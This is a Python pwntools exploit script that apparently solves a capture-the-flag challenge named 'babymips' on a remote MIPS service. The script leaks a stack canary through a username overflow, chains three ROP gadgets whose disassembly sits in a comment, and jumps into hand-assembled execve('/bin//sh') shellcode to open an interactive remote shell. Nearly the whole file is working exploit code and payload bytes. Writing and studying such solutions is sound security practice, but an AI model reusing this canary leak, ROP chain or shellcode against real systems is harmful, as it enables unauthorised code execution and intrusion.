#!/usr/bin/python2
# qemu on remote is patched and has aslr
# doing rop to shellcode
# addiu   $a2, $sp, 0x60+var_28, our nopsled should fall here

from pwn import *
context.update(arch="mips", bits=32, endian="little", os="linux")

#p = process(["./qemu-mipsel","challenge"])
p = remote("babymips.3k.ctf.to",7777)


p.sendafter('username','A'*129)
canary= "\x00"+ p.recvuntil(' , En').replace(' , En','').replace(' \r\n'+'A'*129,'')
canary = p32(u32(canary))
print "[canary] "+(canary).encode("hex")



payload = ""
payload += "\xff\xff\x06\x28" # slti $a2, $zero, -1
payload += "\x62\x69\x0f\x3c" # lui $t7, 0x6962
payload += "\x2f\x2f\xef\x35" # ori $t7, $t7, 0x2f2f
payload += "\xf4\xff\xaf\xaf" # sw $t7, -0xc($sp)
payload += "\x73\x68\x0e\x3c" # lui $t6, 0x6873
payload += "\x6e\x2f\xce\x35" # ori $t6, $t6, 0x2f6e
payload += "\xf8\xff\xae\xaf" # sw $t6, -8($sp)
payload += "\xfc\xff\xa0\xaf" # sw $zero, -4($sp)
payload += "\xf4\xff\xa4\x27" # addiu $a0, $sp, -0xc
payload += "\xff\xff\x05\x28" # slti $a1, $zero, -1
payload += "\xab\x0f\x02\x24" # addiu;$v0, $zero, 0xfab
payload += "\x0c\x01\x01\x01" # syscall 0x40404


'''
__libc_freeres_fn:00465474                 lw      $ra, 0x30+var_4($sp)
__libc_freeres_fn:00465478                 lw      $s3, 0x30+var_8($sp)
__libc_freeres_fn:0046547C                 lw      $s2, 0x30+var_C($sp)
__libc_freeres_fn:00465480                 lw      $s1, 0x30+var_10($sp)
__libc_freeres_fn:00465484                 lw      $s0, 0x30+var_14($sp)
__libc_freeres_fn:00465488                 jr      $ra

.text:00443748                 addiu   $a2, $sp, 0x60+var_28
.text:0044374C                 sw      $zero, 0x60+var_44($sp)
.text:00443750                 move    $a0, $s2
.text:00443754                 sw      $zero, 0x60+var_48($sp)
.text:00443758                 sw      $v0, 0x60+var_4C($sp)
.text:0044375C                 move    $t9, $s1
.text:00443760                 jalr    $t9

.text:00420A04                 move    $t9, $a2
.text:00420A08                 jr      $t9
'''

gadget1=0x00465474
gadget2=0x00443748
gadget3=0x00420A04 


buff = "A"*113+canary+'AAAA'
buff += p32(gadget1) + "A" * 0x1c + (p32(gadget3)*4) + p32(gadget2) + '\x00' * 56 + payload

p.send('dumbasspassword'+buff)
p.interactive()